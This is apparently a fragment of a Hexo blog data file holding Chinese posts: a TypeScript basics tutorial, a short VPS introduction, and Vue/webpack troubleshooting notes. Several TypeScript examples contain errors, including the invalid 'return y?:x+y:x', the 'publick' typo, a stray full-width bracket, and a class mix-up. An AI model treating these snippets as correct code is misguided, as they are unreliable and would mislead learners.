class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//传入参数是数字，返回的也是数字</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum</span>(<span class=\"params\">x: number, y: number</span>): <span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//可选型，用?,sum2(1)可以，sum（1，2）也可以</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum2</span>(<span class=\"params\">x:number,y?:number</span>):<span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y?:x+y:x</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//参数默认值,sum3(1,'5')，y会被自动推导为number</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum3</span>(<span class=\"params\">x?:number,y=<span class=\"number\">0</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x+y</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//剩余参数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">concat</span>(<span class=\"params\">arr:any[],...items:any[]</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr.concat(items)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">concat([],<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br></pre></td></tr></table></figure>\n<h3 id=\"接口\"><a href=\"#接口\" class=\"headerlink\" title=\"接口\"></a>接口</h3><ul>\n<li><p>在面向对象，接口是一个很重要的概念，他是对行为的抽象，而具体如何行动需要由 class 去实现</p>\n</li>\n<li><p>ts 的接口是非常灵活的，既可以对类的一部分行为进行抽象，也可以用于对对象的形状进行描述</p>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//对对象形状的描述</span></span><br><span class=\"line\">interface Person&#123;</span><br><span class=\"line\">    name:string</span><br><span class=\"line\">    age?:number,</span><br><span class=\"line\">    say?:<span class=\"function\"><span class=\"params\">()</span>=&gt;</span><span class=\"keyword\">void</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> yoki:Person=&#123;</span><br><span class=\"line\">    name:<span class=\"string\">'yoki'</span>,</span><br><span class=\"line\">    age:<span class=\"number\">18</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//只读属性，不可修改</span></span><br><span class=\"line\">interface Person&#123;</span><br><span class=\"line\">    readonly id:number</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><blockquote>\n<ul>\n<li>public 修饰的属性或者方法都是公有的，可以在任何地方被访问到，默认所有的属性或方法都是 public</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>private 修饰的属性或者方法都是私有的，不能在声明它的类的外部访问</li>\n<li>protected 修饰的属性或者方法都是受保护的，它与 pravate 类似，区别是它在子类是允许访问的</li>\n</ul>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\">    publick name;</span><br><span class=\"line\">    public <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name=name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a=<span class=\"keyword\">new</span> Animal(<span class=\"string\">'rabbit'</span>)</span><br><span class=\"line\">a.name<span class=\"comment\">//rabbit</span></span><br><span class=\"line\">a.name=<span class=\"string\">'tom'</span><span class=\"comment\">//tom</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal2</span></span>&#123;</span><br><span class=\"line\">    private name;</span><br><span class=\"line\">    public <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name=name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> b=<span class=\"keyword\">new</span> Animal(<span class=\"string\">'rabbit'</span>)</span><br><span class=\"line\">b.name=<span class=\"string\">'tom'</span><span class=\"comment\">//报错</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal3</span></span>&#123;</span><br><span class=\"line\">    protected name;</span><br><span class=\"line\">    public <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name=name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(name)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name)</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.name)<span class=\"comment\">//可以的</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h3><p>是指在定义函数/接口或者类的时候，不预先指定具体的类型，而在使用的时候再指定类型</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//T是运行时候的类型</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createArray</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">value: T, len: number</span>): <span class=\"title\">Array</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Array</span>(len).fill(value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//多个类型</span></span><br><span class=\"line\">function swap&lt;T1,T2&gt;(tuple:[T1,T2]):[T1,T2]「</span><br><span class=\"line\"><span class=\"keyword\">return</span> [tuple[<span class=\"number\">1</span>],tuple[<span class=\"number\">0</span>]]</span><br><span class=\"line\">swap([<span class=\"number\">7</span>,<span class=\"string\">'six'</span>])<span class=\"comment\">//['six',7]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//泛型约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getlen</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">a:T</span>):<span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a.length</span><br><span class=\"line\">&#125;<span class=\"comment\">// length属性不存在type‘T’的里面，error</span></span><br><span class=\"line\"></span><br><span class=\"line\">interface lengthwise&#123;</span><br><span class=\"line\">    length:number</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getlen2</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> <span class=\"title\">lengthwise</span>&gt;(<span class=\"params\">a:T</span>):<span class=\"title\">number</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a.length</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">getlen2([])<span class=\"comment\">//ok</span></span><br><span class=\"line\">getlen2(<span class=\"number\">123</span>)<span class=\"comment\">//error</span></span><br><span class=\"line\"><span class=\"comment\">//泛型类</span></span><br><span class=\"line\">interface Props&#123;<span class=\"attr\">size</span>:<span class=\"string\">'big'</span>|<span class=\"string\">'small'</span>&#125;</span><br><span class=\"line\">interface State&#123;<span class=\"attr\">visibily</span>:boolean&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span>&lt;<span class=\"title\">Props</span>,<span class=\"title\">State</span>&gt;</span>&#123;</span><br><span class=\"line\">    state=&#123;<span class=\"attr\">visibily</span>:<span class=\"literal\">true</span>&#125;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(props,context)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(props,context)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    handleClick=<span class=\"function\"><span class=\"params\">()</span>=&gt;</span><span class=\"keyword\">this</span>.setState(&#123;<span class=\"attr\">show</span>:<span class=\"literal\">false</span>&#125;)</span><br><span class=\"line\">    <span class=\"comment\">//'error',show不在state接口</span></span><br><span class=\"line\">    render()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.state.visibily&amp;&amp; &lt;button&gt; type=&#123;this.props.size&#125; onClick=&#123;this.handleClick&#125; /&gt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ReactDom.render(&lt;App size='middle' /&gt;,document.body)</span><br><span class=\"line\">// error,middle不在props的size里</span><br></pre></td></tr></table></figure>\n"},{"title":"初识vps","date":"2017-11-29T12:13:28.000Z","_content":"\n### vps 是什么\n\n> 以下来自维基百科\n\n* 虚拟专用服务器（英语：Virtual private server，缩写为 VPS），是将一台服务器分区成多个虚拟专享服务器的服务。\n* 实现 VPS 的技术分为容器技术和虚拟机技术 。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。\n* VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。\n\n### vps 能做什么\n\n* 可以进行科学上网，参见[搭建 ss 服务器](https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B)\n* vps 可以配置一个 ip 或者多个 ip。既然有了 ip 那么干的事情就多了。\n* 同时想了解一下 linux 服务器或者部署自己的小作品，这个时候一个配置较低的 vps 就可以发挥作用了。比如托管静态页面，爬虫，起 node 服务等等。\n\n### 一些 vps 推荐\n\n* vultr(我就是用这个的)\n* 搬瓦工\n* hostmybytes\n* linode\n","source":"_posts/study-vps.md","raw":"---\ntitle: 初识vps\ndate: 2017-11-29 20:13:28\ntags:\n---\n\n### vps 是什么\n\n> 以下来自维基百科\n\n* 虚拟专用服务器（英语：Virtual private server，缩写为 VPS），是将一台服务器分区成多个虚拟专享服务器的服务。\n* 实现 VPS 的技术分为容器技术和虚拟机技术 。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。\n* VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。\n\n### vps 能做什么\n\n* 可以进行科学上网，参见[搭建 ss 服务器](https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B)\n* vps 可以配置一个 ip 或者多个 ip。既然有了 ip 那么干的事情就多了。\n* 同时想了解一下 linux 服务器或者部署自己的小作品，这个时候一个配置较低的 vps 就可以发挥作用了。比如托管静态页面，爬虫，起 node 服务等等。\n\n### 一些 vps 推荐\n\n* vultr(我就是用这个的)\n* 搬瓦工\n* hostmybytes\n* linode\n","slug":"study-vps","published":1,"updated":"2018-04-09T12:25:27.714Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034sa004b0iofdqujx5w1","content":"<h3 id=\"vps-是什么\"><a href=\"#vps-是什么\" class=\"headerlink\" title=\"vps 是什么\"></a>vps 是什么</h3><blockquote>\n<p>以下来自维基百科</p>\n</blockquote>\n<ul>\n<li>虚拟专用服务器（英语：Virtual private server，缩写为 VPS），是将一台服务器分区成多个虚拟专享服务器的服务。</li>\n<li>实现 VPS 的技术分为容器技术和虚拟机技术 。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。</li>\n<li>VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。</li>\n</ul>\n<h3 id=\"vps-能做什么\"><a href=\"#vps-能做什么\" class=\"headerlink\" title=\"vps 能做什么\"></a>vps 能做什么</h3><ul>\n<li>可以进行科学上网，参见<a href=\"https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B\" target=\"_blank\" rel=\"noopener\">搭建 ss 服务器</a></li>\n<li>vps 可以配置一个 ip 或者多个 ip。既然有了 ip 那么干的事情就多了。</li>\n<li>同时想了解一下 linux 服务器或者部署自己的小作品，这个时候一个配置较低的 vps 就可以发挥作用了。比如托管静态页面，爬虫，起 node 服务等等。</li>\n</ul>\n<h3 id=\"一些-vps-推荐\"><a href=\"#一些-vps-推荐\" class=\"headerlink\" title=\"一些 vps 推荐\"></a>一些 vps 推荐</h3><ul>\n<li>vultr(我就是用这个的)</li>\n<li>搬瓦工</li>\n<li>hostmybytes</li>\n<li>linode</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"vps-是什么\"><a href=\"#vps-是什么\" class=\"headerlink\" title=\"vps 是什么\"></a>vps 是什么</h3><blockquote>\n<p>以下来自维基百科</p>\n</blockquote>\n<ul>\n<li>虚拟专用服务器（英语：Virtual private server，缩写为 VPS），是将一台服务器分区成多个虚拟专享服务器的服务。</li>\n<li>实现 VPS 的技术分为容器技术和虚拟机技术 。在容器或虚拟机中，每个 VPS 都可分配独立公网 IP 地址、独立操作系统、实现不同 VPS 间磁盘空间、内存、CPU 资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。</li>\n<li>VPS 可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。</li>\n</ul>\n<h3 id=\"vps-能做什么\"><a href=\"#vps-能做什么\" class=\"headerlink\" title=\"vps 能做什么\"></a>vps 能做什么</h3><ul>\n<li>可以进行科学上网，参见<a href=\"https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B\" target=\"_blank\" rel=\"noopener\">搭建 ss 服务器</a></li>\n<li>vps 可以配置一个 ip 或者多个 ip。既然有了 ip 那么干的事情就多了。</li>\n<li>同时想了解一下 linux 服务器或者部署自己的小作品，这个时候一个配置较低的 vps 就可以发挥作用了。比如托管静态页面，爬虫，起 node 服务等等。</li>\n</ul>\n<h3 id=\"一些-vps-推荐\"><a href=\"#一些-vps-推荐\" class=\"headerlink\" title=\"一些 vps 推荐\"></a>一些 vps 推荐</h3><ul>\n<li>vultr(我就是用这个的)</li>\n<li>搬瓦工</li>\n<li>hostmybytes</li>\n<li>linode</li>\n</ul>\n"},{"title":"vue的一些问题集合（二）","date":"2018-04-05T06:19:46.000Z","_content":"\n> 再写一波\n\n## '@/components/'的@\n\n* webpack 可以配置 alias 配置别名，这个@一般是 src 目录的别名\n\n## npm run dev 报端口已经在运行\n\n* 可能你在运行其他项目，去修改一下默认端口\n\n## 父组件怎么调用子组件的方法\n\n* this.$refs 里面找到该实例,前提是先设置了 ref\n* this.$children 里面找到该实例\n\n## nginx 怎么配置\n\n[一大波不靠谱的 nginx 配置](https://juejin.im/post/58bfc412da2f60124db5999a)\n\n## v-if 和 v-show\n\n> v-if 是 dom 没有插入到文档里面，等条件成立，才 append 到 document 里面。\n\n* 等拿到值才可以处理组件内部的逻辑的，不然会报错\n* 有些 v-for 但是还没有拿到值的\n\n> v-show 只是简单通过 css 隐藏了\n\n* 不会导致页面重绘，改善用户体验\n\n## axios 的请求后台不接受\n\n* axios 默认是 json 格式提交，如果后台只支持表单序列化，就要自己转义\n* axios 有个 qs 模块可以试试\n\n## css 的 scoped 有什么功能\n\n* 给每个类或者 id 自动添加 hash，只能给该组件用，不同组件不能进行继承\n\n```javascript\n/ 写的时候是这个\n.a{}\n\n// 编译过后,加上了 hash\n.a[data-v-1ec35ffc]{}\n```\n\n## 小图片渲染出来 base64\n\n* webpack 的 url-loader 处理，对于小于多少 k 一下的图片转成 base64 内联到 html\n* 减少 http 请求降低服务器负担\n* 网络不好的时候，内联的内容先加载，优化体验\n\n## ERROR in static/js/xxxxxxx.js from UglifyJs\n\n* 引入压缩后的 js，webpack 又开启了 uglifyjs 压缩，报错\n\n## keep-alive 缓存组件后很慢\n\n* 因为都是保存在内存里面的，一旦大量组件缓存性能肯定不会好\n","source":"_posts/study-vue2.md","raw":"---\ntitle: vue的一些问题集合（二）\ndate: 2018-04-05 14:19:46\ntags: Vue\n---\n\n> 再写一波\n\n## '@/components/'的@\n\n* webpack 可以配置 alias 配置别名，这个@一般是 src 目录的别名\n\n## npm run dev 报端口已经在运行\n\n* 可能你在运行其他项目，去修改一下默认端口\n\n## 父组件怎么调用子组件的方法\n\n* this.$refs 里面找到该实例,前提是先设置了 ref\n* this.$children 里面找到该实例\n\n## nginx 怎么配置\n\n[一大波不靠谱的 nginx 配置](https://juejin.im/post/58bfc412da2f60124db5999a)\n\n## v-if 和 v-show\n\n> v-if 是 dom 没有插入到文档里面，等条件成立，才 append 到 document 里面。\n\n* 等拿到值才可以处理组件内部的逻辑的，不然会报错\n* 有些 v-for 但是还没有拿到值的\n\n> v-show 只是简单通过 css 隐藏了\n\n* 不会导致页面重绘，改善用户体验\n\n## axios 的请求后台不接受\n\n* axios 默认是 json 格式提交，如果后台只支持表单序列化，就要自己转义\n* axios 有个 qs 模块可以试试\n\n## css 的 scoped 有什么功能\n\n* 给每个类或者 id 自动添加 hash，只能给该组件用，不同组件不能进行继承\n\n```javascript\n/ 写的时候是这个\n.a{}\n\n// 编译过后,加上了 hash\n.a[data-v-1ec35ffc]{}\n```\n\n## 小图片渲染出来 base64\n\n* webpack 的 url-loader 处理，对于小于多少 k 一下的图片转成 base64 内联到 html\n* 减少 http 请求降低服务器负担\n* 网络不好的时候，内联的内容先加载，优化体验\n\n## ERROR in static/js/xxxxxxx.js from UglifyJs\n\n* 引入压缩后的 js，webpack 又开启了 uglifyjs 压缩，报错\n\n## keep-alive 缓存组件后很慢\n\n* 因为都是保存在内存里面的，一旦大量组件缓存性能肯定不会好\n","slug":"study-vue2","published":1,"updated":"2018-04-17T06:59:08.894Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034sc004e0iofm57tuv29","content":"<blockquote>\n<p>再写一波</p>\n</blockquote>\n<h2 id=\"‘-components-‘的\"><a href=\"#‘-components-‘的\" class=\"headerlink\" title=\"‘@/components/‘的@\"></a>‘@/components/‘的@</h2><ul>\n<li>webpack 可以配置 alias 配置别名，这个@一般是 src 目录的别名</li>\n</ul>\n<h2 id=\"npm-run-dev-报端口已经在运行\"><a href=\"#npm-run-dev-报端口已经在运行\" class=\"headerlink\" title=\"npm run dev 报端口已经在运行\"></a>npm run dev 报端口已经在运行</h2><ul>\n<li>可能你在运行其他项目，去修改一下默认端口</li>\n</ul>\n<h2 id=\"父组件怎么调用子组件的方法\"><a href=\"#父组件怎么调用子组件的方法\" class=\"headerlink\" title=\"父组件怎么调用子组件的方法\"></a>父组件怎么调用子组件的方法</h2><ul>\n<li>this.$refs 里面找到该实例,前提是先设置了 ref</li>\n<li>this.$children 里面找到该实例</li>\n</ul>\n<h2 id=\"nginx-怎么配置\"><a href=\"#nginx-怎么配置\" class=\"headerlink\" title=\"nginx 怎么配置\"></a>nginx 怎么配置</h2><p><a href=\"https://juejin.im/post/58bfc412da2f60124db5999a\" target=\"_blank\" rel=\"noopener\">一大波不靠谱的 nginx 配置</a></p>\n<h2 id=\"v-if-和-v-show\"><a href=\"#v-if-和-v-show\" class=\"headerlink\" title=\"v-if 和 v-show\"></a>v-if 和 v-show</h2><blockquote>\n<p>v-if 是 dom 没有插入到文档里面，等条件成立，才 append 到 document 里面。</p>\n</blockquote>\n<ul>\n<li>等拿到值才可以处理组件内部的逻辑的，不然会报错</li>\n<li>有些 v-for 但是还没有拿到值的</li>\n</ul>\n<blockquote>\n<p>v-show 只是简单通过 css 隐藏了</p>\n</blockquote>\n<ul>\n<li>不会导致页面重绘，改善用户体验</li>\n</ul>\n<h2 id=\"axios-的请求后台不接受\"><a href=\"#axios-的请求后台不接受\" class=\"headerlink\" title=\"axios 的请求后台不接受\"></a>axios 的请求后台不接受</h2><ul>\n<li>axios 默认是 json 格式提交，如果后台只支持表单序列化，就要自己转义</li>\n<li>axios 有个 qs 模块可以试试</li>\n</ul>\n<h2 id=\"css-的-scoped-有什么功能\"><a href=\"#css-的-scoped-有什么功能\" class=\"headerlink\" title=\"css 的 scoped 有什么功能\"></a>css 的 scoped 有什么功能</h2><ul>\n<li>给每个类或者 id 自动添加 hash，只能给该组件用，不同组件不能进行继承</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ 写的时候是这个</span><br><span class=\"line\">.a&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译过后,加上了 hash</span></span><br><span class=\"line\">.a[data-v<span class=\"number\">-1</span>ec35ffc]&#123;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"小图片渲染出来-base64\"><a href=\"#小图片渲染出来-base64\" class=\"headerlink\" title=\"小图片渲染出来 base64\"></a>小图片渲染出来 base64</h2><ul>\n<li>webpack 的 url-loader 处理，对于小于多少 k 一下的图片转成 base64 内联到 html</li>\n<li>减少 http 请求降低服务器负担</li>\n<li>网络不好的时候，内联的内容先加载，优化体验</li>\n</ul>\n<h2 id=\"ERROR-in-static-js-xxxxxxx-js-from-UglifyJs\"><a href=\"#ERROR-in-static-js-xxxxxxx-js-from-UglifyJs\" class=\"headerlink\" title=\"ERROR in static/js/xxxxxxx.js from UglifyJs\"></a>ERROR in static/js/xxxxxxx.js from UglifyJs</h2><ul>\n<li>引入压缩后的 js，webpack 又开启了 uglifyjs 压缩，报错</li>\n</ul>\n<h2 id=\"keep-alive-缓存组件后很慢\"><a href=\"#keep-alive-缓存组件后很慢\" class=\"headerlink\" title=\"keep-alive 缓存组件后很慢\"></a>keep-alive 缓存组件后很慢</h2><ul>\n<li>因为都是保存在内存里面的，一旦大量组件缓存性能肯定不会好</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>再写一波</p>\n</blockquote>\n<h2 id=\"‘-components-‘的\"><a href=\"#‘-components-‘的\" class=\"headerlink\" title=\"‘@/components/‘的@\"></a>‘@/components/‘的@</h2><ul>\n<li>webpack 可以配置 alias 配置别名，这个@一般是 src 目录的别名</li>\n</ul>\n<h2 id=\"npm-run-dev-报端口已经在运行\"><a href=\"#npm-run-dev-报端口已经在运行\" class=\"headerlink\" title=\"npm run dev 报端口已经在运行\"></a>npm run dev 报端口已经在运行</h2><ul>\n<li>可能你在运行其他项目，去修改一下默认端口</li>\n</ul>\n<h2 id=\"父组件怎么调用子组件的方法\"><a href=\"#父组件怎么调用子组件的方法\" class=\"headerlink\" title=\"父组件怎么调用子组件的方法\"></a>父组件怎么调用子组件的方法</h2><ul>\n<li>this.$refs 里面找到该实例,前提是先设置了 ref</li>\n<li>this.$children 里面找到该实例</li>\n</ul>\n<h2 id=\"nginx-怎么配置\"><a href=\"#nginx-怎么配置\" class=\"headerlink\" title=\"nginx 怎么配置\"></a>nginx 怎么配置</h2><p><a href=\"https://juejin.im/post/58bfc412da2f60124db5999a\" target=\"_blank\" rel=\"noopener\">一大波不靠谱的 nginx 配置</a></p>\n<h2 id=\"v-if-和-v-show\"><a href=\"#v-if-和-v-show\" class=\"headerlink\" title=\"v-if 和 v-show\"></a>v-if 和 v-show</h2><blockquote>\n<p>v-if 是 dom 没有插入到文档里面，等条件成立，才 append 到 document 里面。</p>\n</blockquote>\n<ul>\n<li>等拿到值才可以处理组件内部的逻辑的，不然会报错</li>\n<li>有些 v-for 但是还没有拿到值的</li>\n</ul>\n<blockquote>\n<p>v-show 只是简单通过 css 隐藏了</p>\n</blockquote>\n<ul>\n<li>不会导致页面重绘，改善用户体验</li>\n</ul>\n<h2 id=\"axios-的请求后台不接受\"><a href=\"#axios-的请求后台不接受\" class=\"headerlink\" title=\"axios 的请求后台不接受\"></a>axios 的请求后台不接受</h2><ul>\n<li>axios 默认是 json 格式提交，如果后台只支持表单序列化，就要自己转义</li>\n<li>axios 有个 qs 模块可以试试</li>\n</ul>\n<h2 id=\"css-的-scoped-有什么功能\"><a href=\"#css-的-scoped-有什么功能\" class=\"headerlink\" title=\"css 的 scoped 有什么功能\"></a>css 的 scoped 有什么功能</h2><ul>\n<li>给每个类或者 id 自动添加 hash，只能给该组件用，不同组件不能进行继承</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ 写的时候是这个</span><br><span class=\"line\">.a&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 编译过后,加上了 hash</span></span><br><span class=\"line\">.a[data-v<span class=\"number\">-1</span>ec35ffc]&#123;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"小图片渲染出来-base64\"><a href=\"#小图片渲染出来-base64\" class=\"headerlink\" title=\"小图片渲染出来 base64\"></a>小图片渲染出来 base64</h2><ul>\n<li>webpack 的 url-loader 处理，对于小于多少 k 一下的图片转成 base64 内联到 html</li>\n<li>减少 http 请求降低服务器负担</li>\n<li>网络不好的时候，内联的内容先加载，优化体验</li>\n</ul>\n<h2 id=\"ERROR-in-static-js-xxxxxxx-js-from-UglifyJs\"><a href=\"#ERROR-in-static-js-xxxxxxx-js-from-UglifyJs\" class=\"headerlink\" title=\"ERROR in static/js/xxxxxxx.js from UglifyJs\"></a>ERROR in static/js/xxxxxxx.js from UglifyJs</h2><ul>\n<li>引入压缩后的 js，webpack 又开启了 uglifyjs 